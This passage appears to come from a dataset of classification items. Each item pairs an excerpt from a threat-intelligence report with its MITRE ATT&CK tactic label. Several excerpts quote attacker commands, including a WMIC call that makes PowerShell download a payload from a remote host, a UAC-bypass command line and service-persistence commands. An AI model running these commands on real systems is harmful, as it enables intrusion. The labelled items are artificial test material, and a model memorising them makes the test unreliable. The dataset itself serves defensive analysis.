        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Looking at the contents of the malicious HTML file, we can pick out the HTML smuggling in the code. First, looking at the<script>tags we come to the following:\nIf we take that data blob, decode the contents with base64, and export that into a file, we can find the zipped ISO file hidden in the document:\nThe PK header indicates the data is the start of azip file, and the following data reveals the contents to be an ISO file.\nThe initial access package from the threat actor used the Windows xcopy utility to rename rundll32.exe to entails.exe. This was likely to evade detection logic based around command line execution. Entails.exe, which loaded the IcedID DLL, was then observed injecting into a cmd.exe process on the beachhead host.\nBelow we can see the IcedID loader in memory in the entails.exe process:\nThe entails.exe process first opened cmd.exe with the GrantedAccess of 0x1fffff, which maps toPROCESS_ALL_ACCESSrights, followed by a call to CreateRemoteThread, which was recorded by Sysmon Event ID 10 and 8 respectively as shown below:\nWe can also see from memory, beacon.dll was injected into cmd.\nScanning the process memory of cmd.exe, the YARA rulewin_cobalt_strike_autofrom Malpedia fired. The following Cobalt Strike beacon configuration was then extracted from process memory:\nThe IP and port match what we see in memory:\nThe injected cmd.exe, in turn, injected into rundll32.exe.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The activity described in this blog post presented a well-known Iranian threat actor utilizing their triedand-true techniques to breach targeted organizations. Luckily, with FireEye's platform in place, our Managed Defense customers were not impacted. Furthermore, upon the blocking of this activity, FireEye was able to expand upon the observed indicators to identify a broader campaign, as well as the use of new and old malware. \nWe suspect this will not be the last time APT34 brings new tools to the table. Threat actors are often reshaping their TTPs to evade detection mechanisms, especially if the target is highly desired. For these reasons, we recommend organizations remain vigilant in their defenses, and remember to view their environment holistically when it comes to information security. \nHard Pass: Declining APT34's Invite to Join Their Professional Network | Mandiant | Google Cloud Blog Learn more about Mandiant Managed Defense, and catch an on-demand recap on this and the Top 5 Managed Defense attacks this year. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Use of Cobalt Strike's Get-System named pipe technique was observed on the Domain Controller and other hosts to elevate to System privileges.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The initial access used in this intrusion was a malicious word document dubbed \"Apply Form.docm\". This document purported to be an application form for the technology and telecommunications companyLumen.\nThis was originally found and shared by@StopMalvertisinina tweet detailing the lure and the payload. The precise delivery method remains unknown as we do not have direct evidence on how this malicious document was delivered. We assert with a medium level of confidence, based on the previoussimilarreports, that those documents were likely delivered through spearphishing attachments in emails (T1566).",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To persist in collecting the victim's sensitive data, even if the affected system is restarted or the Agent Tesla process is killed, it does the following two things.\n1. TaskScheduler\nIt executes a command to create a task in the system TaskScheuler inside the payload module. The command in my analysis environment is \"C:\\Windows\\System32\\schtasks.exe\" /Create /TN \"Updates\\kCqKCO\" /XML \"C:\\Users\\Bobs\\AppData\\Local\\Temp\\tmp68E9.tmp,\" where \"Updates\\kCqKCO\" is the task name and \"/XML\" specifies it's been created from an XML file that is provided by following a parameter (i.e. tmp68E9.tmp). Figure 5.1 shows the details of the XML content, where the file \"C:\\Users\\Bobs\\AppData\\Roaming\\kCqKCO.exe\" is a duplication of the downloaded \"dasHost.exe.\" The task is set to start at the victim's logon.\n2. Auto-run in the system registry\nThe core module adds an auto-run item in the system registry\"C:\\Users\\Bobs\\AppData\\Roaming\\sOFvE\\sOFvE.exe\" (shown in Figure 5.2). It is another duplication of \"dasHost.exe\" that is launched automatically at system startup.",
        "output": "persistence",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once established as a scheduled task, the co-opted Word 2007 process dropped and loaded a scanning tool popular among attackers, NbtScan.exe. BISMUTH then immediately used the scanning tool to scan an IP address range within the organization. Following this network scan, the Word 2007 process launched a malicious script using a living-off-the-land-binary, rundll32.exe, resulting in a scan on a myriad of common ports, including 21, 22, 389, 139, and 1433. BISMUTH listed devices with open ports in a .csv file. \nWhile network scanning was underway, the group performed other reconnaissance activities. They gathered information about domain and local administrators, checked whether users had local administrative privileges, and collected device information-aggregating results in a .csv for exfiltration. In addition, the group once again used MsMpEng.exe with the malicious sideloaded DLL to connect to another device that appears to have been designated by BISMUTH at some point during the attack as an internal C2 foothold and exfiltration staging device. ",
        "output": "discovery",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After dropping a copy of itself, it executes the dropped copy as Administrator using a UAC (User Account Control) bypass technique. It implements a variation of the technique ucmDccwCOMMethod in UACMe, thereby abusing the built-in Windows AutoElevate backdoor. \nIt first checks whether atcuf32.dll, aswhook.dll, and avp.exe are loaded in the system. These files are from security defenders BitDefender, Avast, and Kaspersky, respectively. If one of these is loaded, it does not proceed to the UAC bypass routine. It then drops a shortcut file to <%User Temp%\\{random file name}.lnk> that contains the command line \nrundll32.exe SHELL32,ShellExec_RunDLL   \n\"C:\\Windows\\system32\\ODBCCONF.EXE\" /a {configsysdsn OCNKBENXGMI   \netba odjcnr} /A {installtranslator fxodi} -a {installdriver   \nqmprmxf} /a {configsdn HHAP} regsvr \"{dropped copy path and file   \nname}.\" /S /e -s \nIt then creates an elevated COM object for CMLuaUtil and uses it to set a custom display calibrator in the registry that points to the dropped LNK file. It sets the custom display calibrator by setting the registry value ",
        "output": "privilege escalation",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1007 System Service Discovery   \nT1012 Query Registry   \nT1016 System Network Configuration   \nDiscovery   \nT1016.001 Internet Connection Discovery   \nT1018 Remote System Discovery \nBlog Contact sales T1049 System Network Connections Discover T1057 Process Discovery T1069 Permission Groups Discovery T1069.001 Local Groups T1069.002 Domain Groups T1069.003 Cloud Groups T1082 System Information Discovery T1083 File and Directory Discovery T1087 Account Discovery T1087.001 Local Account T1087.002 Domain Account T1087.004 Cloud Account T1135 Network Share Discovery T1201 Password Policy Discovery T1482 Domain Trust Discovery T1518 Software Discovery T1518.001 Security Software Discovery T1615 Group Policy Discovery ",
        "output": "discovery",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: When Upatre is executed, a PDF document is quickly downloaded and displayed while Upatre is delivered in the background. The document displayed has been either one of two PDFs.  The first PDF, which was used until March 17, contained some information about Viagra: \nFigure 1: Sexual Dysfunction, what's your function? \nFigure 1: Sexual Dysfunction, what's your function? \nFor all the samples we've observed since, is related to an event in 2012 against military drones in the United States. \nFigure 2: Document displayed to Users after executing attachment \nFigure 2: Document displayed to Users after executing attachment \nThese PDFs are one of the key indicators of recent Upatre activity.  Most communication in Upatre was performed using standard HTTP and could be easily identified. This included the nonstandard port HTTP traffic, and occasional intermittent SSL traffic. However, a new variant has changed drastically and added SSL encryption from the beginning. In these samples, all communication after the identification of IP address from public websites has been placed inside an SSL session making identification of the threat more difficult. ",
        "output": "execution",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After two days and 11 hours, the threat actor droppedRcloneon a file server and exfiltrated several files over SFTP to190.2.146[.]96:22. The typos made on the commands, and the time it took to exfiltrate the files, suggest that exfiltration happened manually (hands-on-keyboard activity):\nThe exfiltration could easily be spotted from a network perspective in controlled environments since the amount of exfiltrated data is very high compared to the usual traffic:\nWe reported on the usage of Rclone in a couple of ourprevious reports. Additionally,this blog from NCC Groupis a great resource for understanding exfiltration via Rclone and detecting this activity using Sigma rules.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Image is taken fromBumbleBee Zeros in on Meterpreter case\nFor remote access tools used as a means of C2, Anydesk topped the statistics. While most remote access tools utilize TLS/SSL, data can still be found to inform use in the environment. Anydesk, for instance leaves logs in the user's AppData and C:\\ProgramData that can inform threat actor usage.\nLike inEmotet Strikes Again  LNK File Leads to Domain Wide Ransomwareyou can locate the login IP of the threat actor utilizing the Anydesk tool.\nIn this same case, we saw not just one, but multiple remote access tools with TacticalRMM/MeshCentral being used in tandem with Anydesk.\nFrom a network monitoring perspective, we can see this type of activity by reviewing dns and TLS/SSL data,like this example fromStolen Images Campaign Ends in Conti Ransomwarewhere the many DNS connections from the Splashtop Streamer tool would be easily detected in network traffic or DNS logs.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ScreenConnect\nAs part of the initial discovery, the threat actor leveraged ScreenConnect's command execution to obtain system, network, users and domain administrators information. This activity can typically be traced through the process creation logs (Security4688and Sysmon1).\nCobalt Strike\nAfter launching Cobalt Strike DLL beacons, the threat actor used severalnltestcommands to look up domain information.\nquser\nLater, throughout the intrusion, the threat actor leveragedImpacket'sWMIEXECclass over Metasploitto discover active user sessions using thequsercommand.\nadcomp.bat\nThe threat actor was also observed running a bash script calledadcomp.bat,in order to enumerate the names, OS versions, IP addresses, and other information on the domain controllers.\nThe content of this script was the following PowerShell command:\nNetping\nWe observed the threat actor drop a binary namednetping.exeearly in the third day of the intrusion, which they promptly executed (and later erased) as outlined in Sysmon's process creation logs.\nWhile Sysmon's network events do not record ICMP traffic, network captures recorded at the same time a PING-sweep (ICMP type 8) of 255 hosts confirming the netping executable was likely leveraged to identify devices on the/24range.\nNetscan\nNetScan fromSoftPerfecthas been reportedmultiple timesas a tool of choice for network discovery. This time, the threat actor dropped it on the third day of the intrusion to perform an RDP (port3389) scan.\nManual Discovery\nOn the file server, the threat actor was seen browsing several folders around the same time these were exfiltrated, confirming manual exfiltration from hands-on keyboard activities. This can be seen by examining the ShellBags registry artifact using Eric Zimmerman'sShellBags Explorer.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Windows Defender Exploit Guard (Windows Defender EG), a new set of host intrusion prevention capabilities, helps reduce the attack surface area by locking down the device against a wide variety of attack vectors. It can help stop attacks that use fileless malware by: \nMitigating kernel-memory exploits like EternalBlue through Hypervisor Code Integrity (HVCI), which makes it extremely difficult to inject malicious code using kernel-mode software vulnerabilities Mitigating user-mode memory exploits through the Exploit protection module, which consists of a number of exploit mitigations that can be applied either at the operating system level or at the individual app level Mitigating many script-based fileless techniques, among other techniques, through Attack Surface Reduction (ASR) rules that lock down application behavior ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Evidence of likely usage of the credential theft tool Mimikatzwas also uncovered through the presence of a related log file mimikatz.log. Microsoft IR assesses that Mimikatz was likely used to attain credentials for privileged accounts. ",
        "output": "credential access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1059.003 Command and Scripting Interpreter (Windows Command Shell) \nDescription: \nRaspberry Robin uses the \"standard-in\" command prompt feature cmd/R $\\prec$ to read and execute a file with a name composed of several seemingly random alphanumeric characters \nObservable : \nC:\\Windows\\system32\\cmd.exe\" /R CMD<lAkTp.mY0 ",
        "output": "execution",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The malware's persistence is usually guaranteed with one of the following mechanisms: \nService installation \nCreation of a new Windows registry key value \nCreation of a new scheduled task. \nThe service is usually installed by the malware with the execution of the Windows sc.exe utility. \n1 sc create \"[MALWARE_NAME_NO_EXT]\" binpath $=$ \"[MALWARE_FULL_PATH]\" /[ARGUMENT]\"  \n2 displayname $=$ \"WORKPATH\" type $=$ own start $=$ auto  \n3 sc description \"[MALWARE_NAME_NO_EXT]\" \"This service keeps your installation up to date with t  \n4 sc start \"[MALWARE_NAME_NO_EXT]\"  \n\uedd9 \uedda\nThe registry value is equal to the copied malware file name, without the extension, and is stored under the following key: \nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunValue name: \"[MALWARE_NAME_NO_EXT]\"Value data: \"[MALWARE_FULL_PATH] [ARGUMENT]\"\nThe scheduled task is created using a hard-coded XML template that is modified at runtime and dropped in the file system using the same malware file path, but with a different extension, .xml instead of .exe. \nThe generated XML file is then used with the Windows schtasks.exe utility to create the task. \nFor example: \nThe task and service description change according to the variant. ",
        "output": "persistence",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A scheme orchestrated by the DPRK has been infiltrating companies worldwide, posing significant cybersecurity risks and violating international sanctions. DPRK IT workers, operating under the direction of their government, are securing remote positions with businesses across the globe.\nThese operatives pose aslegitimate freelancers or applicants from various countries, generating substantial revenue thatdirectly funds North Korea's weapons of mass destruction (WMD) programs. According to U.S. Department of Justice reports, individual IT workers can earn up to $300,000 annually. The North Korean government retains up to 90% of these earnings, which collectively totals hundreds of millions of dollars each year.\nThe tactics, techniques and procedures (TTPs) employed by these operatives include the following:\nUsing stolen or synthetic identities \nUsing falsified employment and identity documents \nWorking with U.S.-based accomplices to create the appearance of domestic work locations \nUsing virtual private networks (VPNs) to mask true geographic locations \nManipulating employment verification processes \nExtorting employers [PDF]by threatening to publish sensitive information\nThis operation puts global companies at risk ofdata breaches, intellectual property theftand legal consequences. The scheme takes advantage of the heightened prevalence of remote work and the challenges in verifying digital identities.\nTraditional insider threat programs are unlikely to fully address this state-sponsored activity. Organizations need an approach that combines identity verification, remote work security and insider risk management.\nIn this analysis, Unit 42 will provide:\nAn examination of DPRK IT workers' TTPs \nStrategies for enhancing identity verification processes \nDetection methodologies for identifying anomalous behavior in remote work setups \nGuidance on improving organizational resilience against social engineering \nPractical solutions for strengthening defenses against this threat\nOur objective is to equip cybersecurity professionals and organizations with detection and defensive strategies.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Phishing,exposed remote desktop protocol (RDP),compromised credentialsandunpatched vulnerabilitiesare the most common attack vectors that ransomware actors exploit to gain initial access, as detailed in theUnit 42 Ransomware Threat Report. These techniques are simple but effective and can be carried out against any individual or organization. Some ransomware combines multiple techniques and utilizes commodity malware such asEmotetandTrickBotto breach a victim's environment. We believe attackers can also use the same techniques to gain initial access to cloud environments.\nAs with on-premises IT infrastructure, where hundreds of employees may work in the same network, hundreds of engineers may share and work in the same cloud infrastructure. If an attacker can compromise one engineer's laptop, that attacker can then potentially pivot from the laptop to the cloud infrastructure. This helps explain why attackers often see credentials as a prime target.\nAnother common attacker vector is unpatched vulnerabilities exposed to the public internet. Our previous research onexposed vulnerabilitiesfound that 24% of exposed VM instances in public clouds have known vulnerabilities. If an attacker could find and compromise a vulnerable VM instance on the internet, the instance could serve as a gateway into the victim's cloud infrastructure.\nBelow are two hypothetical examples showing how an attacker could use these techniques to gain an initial foothold in a victim's cloud environment.\nExample 1: Compromised Laptop via Phishing Emails\nIf a developer's laptop is compromised  for example, by phishing emails  cloud credentials stored on the laptop could give attackers initial access to an organization's cloud infrastructure. Cloud Service Providers' (CSPs) command-line tools commonly store credentials in specific directories on the host.Malwarethat targets cloud environments often enumerates these directories.\nIf the developer also uses CSPs' web consoles, attackers may also find passwords in the password manager or active access tokens in the browsers. Any retrieved credential could be used to impersonate the developer and gain initial access to the victim's cloud infrastructure.\nExample 2: Compromised Server via Unpatched Vulnerabilities\nAny remote code execution (RCE) vulnerability exposed to the internet may allow attackers to gain initial access. For example, an attacker can remotely exploit an RDP server with theBlueKeep vulnerabilityand gain full control of the server. Since the server is in the victim's cloud environment, the attacker may find cloud credentials on the server and use the credentials to pivot into the cloud.\nAnother way that attackers can harvest cloud credentials is through metadata services. Metadata services listen on a special IP address that applications on a VM instance can query to obtain the instance's information such as tags, region and cloud access tokens. All CSPs support metadata services. Any exposed vulnerability that allows attackers to reach this special IP address may allow the attacker to steal cloud access tokens. Vulnerabilities likeserver-side request forgery(SSRF) are commonly exploited to access metadata services.\nBest Practices to Limit Initial Access\nThese hypothetical examples both illustrate the value of using best practices to limit the potential for initial access. In particular, organizations can reduce the likelihood of cloud incidents  ransomware or otherwise  by educating employees about phishing, improvingidentity and access managementpolicies and limiting what is exposed to the public internet. If possible, use thelatest versionof the metadata service to prevent attacks like SSRF.",
        "output": "initial access",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In previous cases, we generally saw some lag time between infection and further actions but this time things moved much quicker, starting with initial discovery executed by Bazar less than 5 minutes after initial execution.\nDiscovery command run by Bazar:\nSeven minutes later, after launching a Cobalt Strike beacon, AdFind was used running the same discovery pattern seen in previous reporting. This was started via a bat script. It appears that the threat actors are now piping these commands into a batch file one at a time instead of dropping adf.bat to disk.\nOnce on the domain controller the PowerShell Active Directory module was loaded.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ZLoader has used various persistence methods across separate campaigns. The first method observed by Microsoft Security Researchers involves the ZLoader DLL using\u202frundll32.exe\u202fto register itself. In other documented cases, it also creates the following persistence mechanisms for itself or its modules: \nRegistry entriesunder\u202fHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  \nFiles in the\u202fStartup\u202ffolder\nIn more recent campaigns, the attackers maliciously used Atera, a legitimate remote monitoring software. While Atera was not compromised, attackers leveraged its built-in Splashtop Remote Access capabilities to achieve persistence on the compromised device. ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Cybereason Nocturnus IR team observed multiple persistence techniques that were used by Winnti over the course of the intrusion. While some techniques are quite trivial and well-known, some persistence techniques are rare and advanced which only a handful of threat actors are known to have used before. ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID\nOnce the VBA macro was invoked, Excel connected to the hard-coded domain and downloaded the first stage of the IcedID payload.\nWhen the VBA macro from Excel calls out to the hard-coded domain, it has multiple interesting characteristics, including:\nTwo OPTIONS requests followed by a GET request. \nUser-agent fields mentioning Microsoft Office. \nSpecific HTTP headers such asX-Office-Major-Version,X-MSGETWEBURL,X-IDCRL_ACCEPTED, andUA-CPU.\nOnce the IcedID payload is successfully retrieved, it will be decoded with Base64 and written to disk. In this case, the payload was written to the path retrieved fromApplication.DefaultFilePath, which is the default path used by Excel when it opens files.\nThe random name generated for the IcedID payload may be either 1 to 7 random digits, or4500. This is because theRndfunction will return \"a value less than 1 but greater than or equal to zero\".\nOnce the IcedID payload is successfully written to disk, the following post deployment steps are initiated:\nRundll32.exe is copied into a file named calc.exe under the path returned byApplication.DefaultFilePath. \nCalc.exe (renamed rundll32.exe) is used to invoke the IcedID payload.\nIn this case, rundll32.exe was copied into the user Documents folder and named calc.exe. The name 'calc.exe' is hard-coded into the VBA code and will not be changed.\nOnce the VBA macros invoked the IcedID payload, the parent-child process relationship between Excel and calc.exe was observed.\nThe following diagram provides a visual summary of the process to execute IcedID on the endpoint.\nIcedID VNC\nThe threat actors were observed making use of an VNC module that was spawned by IcedID to spawn the Microsoft Edge browser:\nWe were able to reconstruct some of the VNC traffic thanks to@0xThiebaut's toolPCAPeek. You can see the below options such as Edge, Chrome, Firefox, CMD, Task Manager and run dialog. Based on the visual it appears to be the KeyHole VNC modulereported first observedin Oct 2022 by NVISO.\nIn another instance, a run dialog was observed being used to execute the calc.exe file that was created earlier. More information can be found about thishere.\nHowever, the command below would have no effect in this case as calc.exe is a renamed version of rundll32 and no parameters were passed.\nSeveral other programs were seen run in this manner, as seen in process execution logs below:\nCobalt Strike\nThe threat actors used Cobalt Strike beacons throughout the intrusion. The first beacon was executed via PowerShell, which in turn was executed initially by a command shell which was started by the IcedID malware at the same time a DLL beacon was also executed.\nThe downloaded PowerShell payload, previously hosted on hxxps://aicsoftware[.]com:757/coin, is available onVirusTotal. Here is the content of the payload, where we can observe an object being created in memory using an encoded string. We will walk through decoding this string to view the Cobalt Strike configuration present within.\nAfter initial Base64 decoding, we found the payload used thedefault Cobalt Strike XOR value of 35which allows for the next step of decoding the payload.\nSecond stage decoding:\nAfter this an MZ header can be observed. From there, the data can be saved and reviewed using1768.pyfromDidier Stevens, revealing the Cobalt Strike configuration embedded within:\nThe full configuration:\nAfter using PowerShell beacons during the first day on the beachhead host and a Domain Controller, the threat actors moved to using DLL files exclusively for the remainder of Cobalt Strike beacons deployed during the intrusion. Other notable executions included the use of batch files:",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Obtaining credentials Mimikatz Gaining Outlook credentials   \nPass-the-hash and pass-the-ticket   \nPropagation via Windows Admin Shares   \nWindows Management Instrumentation (WMI) ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Interestingly, due to what seems to be an OPSEC mistake using the attacker's shell upload and download command, they revealed the use of Kali Linux to execute remote commands. \ncmd.exe /q /c #upload c:\\users\\<user>\\documents\\<doc> /home/kali/desktop/<doc> 1> \\\\127.0.0.1\\admin\\$\\<num>.<num> 2>&1 \ncmd.exe /q /c #download c:\\users\\<user>\\documents\\<doc> /home/kali/desktop/<doc> 1> \\\\127.0.0.1\\admin\\$\\<num>.<num> 2>&1 \nIt is unlikely that the attackers had a Kali Linux installation inside the victim's network, so remote control of the systems was likely achieved through the SSH tunnels described earlier. ",
        "output": "command and control",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Quasar allows the tool user to escalate the client's running privileges, as seen in the source code shown in figure 5. To escalate the client's running privileges, Quasar attempts to launch a command prompt (cmd.exe) as an administrator. The elevated command prompt then relaunches the client. The client inherits the parent process' now-elevated privileges. If the Window's User Account Control (UAC) is configured, this method generates a UAC pop-up window on the target host, which asks the target host user to confirm the process of running the command prompt as the administrator. \nWindowsAccountHelper.GetAccountType() != \"Admin\") { ProcessStartInfo processStartInfo $=$ new ProcessStartInfo { FileName $=$ \"cmd\", Verb $=$ \"runas\", Arguments $=$ \"/k START \\\"\\\" \\\"\" $^+$ ClientData.CurrentPath $^+$ \"\\\" & EXIT\", \nWindowStyle $=$ ProcessWindowStyle.Hidden, UseShellExecute $=$ true }; ",
        "output": "privilege escalation",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Confluence RCE provided SYSTEM access to the beachhead. This was utilized to create a local administrator user named 'backup'. With the 'backup' user, the threat actor was able to RDP to the beachhead with a proxy connection via their Metasploit payload and execute mimikatz. The mimikatz execution resulted in the disclosure of an easily crackable hash for the 'Administrator' account on the beachhead. Unfortunately, this password was re-used across the hosts in the environment. Utilizing the 'Administrator' account on a File Server, the threat actor was able to locate cleartext credentials for other privileged accounts account (see 'Credential Access').",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Today, more organizations are adopting existing SaaS tools for tasks like handling file storage, building websites, and more importantly, enabling collaboration within and outside of the organization. For example, many website builders allow users to easily create websites without having to write any code themselves, and form builders allow users to easily create and share surveys, registration forms, etc. Recently, we've seen that cybercriminals have begun to abuse these SaaS platforms for their own nefarious uses. In early 2022, we noticed an uptick in phishing URLs hosted on legitimate SaaS platforms, and we decided to further investigate this trend.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the first few days after the successful initial access, the attackers conducted limited reconnaissance of the endpoint and deployed two different malware families MagicRAT and \nVSingle on the infected endpoint to maintain covert access to the system. Just like with the first victim, the attackers then started to perform Active Directory (AD) related explorations (via impacket and VSingle) to identify potential endpoints to laterally move into. The table below illustrates the commands executed to perform such actions. \nOnce the list of computers and users is obtained, the attackers would manually ping specific endpoints in the list to verify if they are reachable (with an occasional tracert). VSingle deployment on new hosts was done by using WMIC to start a remote process. This process was, in fact, a PowerShell snippet that would download VSingle from a remote system [T1608/001]. \nWMIC /node:<Computer_Name> process call create \"powershell.exe (New-Object System.Net.Webclient).DownloadFile('<remote_location>/svhostw.exe','<local_path>\\\\svhostww.exe')\" \nIn some infections, we observed the deployment of impacket tools on other endpoints to move laterally and establish an interactive shell. \nThis stage of the attacks was clearly manual work performed by a human operator. While trying to establish interactive remote console sessions, we can see the operators making errors on the commands. \nThe attackers typically take their time to explore the infected system by obtaining file listings of multiple directories of interest to them. When files of particular interest are found they are put into a .rar archive for exfiltration, typically via one of the custom-developed implants running on the system. ",
        "output": "lateral movement",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the victim uncompressed the zip, they clicked the Windows Shortcut file John-_Shimkus.lnk which executed the infection flow.\nOf note, the image 2.jpg that was alongside the payload in the .zip was not used by the malware. We assess that it was likely used to \"pad\" the zip in order to decrease detection potential.\nUpon execution of the Windows Shortcut, there were several steps of execution that are discussed further below.\nStarting with the .lnk , we were able to parse the file which revealed a long, obfuscated argument.\nAfter decoding the cmd.exe argument, it becomes the following command, which outputs text to the ieuinit.inf file:\nAnd then moves a legitimate copy of the binary, ie4uinit.exe, to a custom location while also setting some additional environment variables.\nThis section of commands appeared as follows in the process activity on the beachhead host:\nAbusing ie4uinit.exe (LOLBin)\nThe flow uses a documented execution hijack of IE4uinit.exe (https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/). By supplying a \"side-loaded\" .inf file to IE4uinit.exe, it can be used to load and execute COM scriptlets (SCT) from remote servers. In this case it was observed to reach out to the URL:\nThis was visible from the host via a DNS lookup by the ie4uinit.exe process:\nAnd with a Suricata rule:\nWe can also use Prefetch to confirm that ie4uinit.exe interacted with the malicious ieuinit.inf:\nMore_Eggs\nShortly after the execution of ie4uinit.exe, the DLL 20350.dll was dropped in the AppData folder. The process wmiprvse.exe then spawned the following command:\nThis DLL created .txt files as well as the legitimate MSXSL executable that were used in the next stage of execution:\nThe chain then used schtasks to setup persistence for the more_eggs malware.\nAbusing msxsl.exe to deploy more_eggs\nThe more_eggs payload was finally loaded using the msxsl.exe binary using the documented technique https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/:\nThe file provided to msxsl.exe, 29D88F75006BE8A.txt, was an obfuscated JScript to load the more_eggs malware.\nAfter executing, the more_eggs malware consistently ran the command:\nMore than one and a half days after initial infection, the threat actor deployed a Cobalt Strike Beacon using regsvr.32.exe:\nThe .OCX file was an unsigned DLL file, with a size of 230KB.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
